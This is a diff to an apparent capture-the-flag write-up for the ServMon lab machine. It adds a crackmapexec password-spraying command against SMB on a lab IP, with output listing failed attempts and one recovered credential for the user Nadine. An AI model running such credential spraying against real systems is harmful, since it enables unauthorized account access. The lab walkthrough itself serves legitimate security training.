@@ -304,7 +304,7 @@ We `download` both files using `wget`:
 
 <br />
 
-To enumerate some information about the Windows machine, we start running the typical crackmapexec oneliner:
+To enumerate some information about the Windows machine, we start running the typical `crackmapexec` oneliner:
 
 <br />
 
@@ -441,5 +441,23 @@ What if we try to retrieve this one?
 GG!! We have found several `passwords`!!
 
 We `save` the output to a file and continue with the enumeration.
+
+<br />
+
+We can now use `crackmapexec` to see if any of these passwords work for Nadine or Nathan:
+
+<br />
+
+```bash
+❯ crackmapexec smb 10.10.10.184 -u users.txt -p passwords.txt
+SMB         10.10.10.184    445    SERVMON          [*] Windows 10.0 Build 17763 x64 (name:SERVMON) (domain:ServMon) (signing:False) (SMBv1:False)
+SMB         10.10.10.184    445    SERVMON          [-] ServMon\Nadine:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE 
+SMB         10.10.10.184    445    SERVMON          [-] ServMon\Nathan:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE 
+SMB         10.10.10.184    445    SERVMON          [-] ServMon\Nadine:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE 
+SMB         10.10.10.184    445    SERVMON          [-] ServMon\Nathan:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE 
+SMB         10.10.10.184    445    SERVMON          [-] ServMon\Nadine:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE 
+SMB         10.10.10.184    445    SERVMON          [-] ServMon\Nathan:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE 
+SMB         10.10.10.184    445    SERVMON          [+] ServMon\Nadine:L1k3B1gBut7s@W0rk
+```
 
 <br />
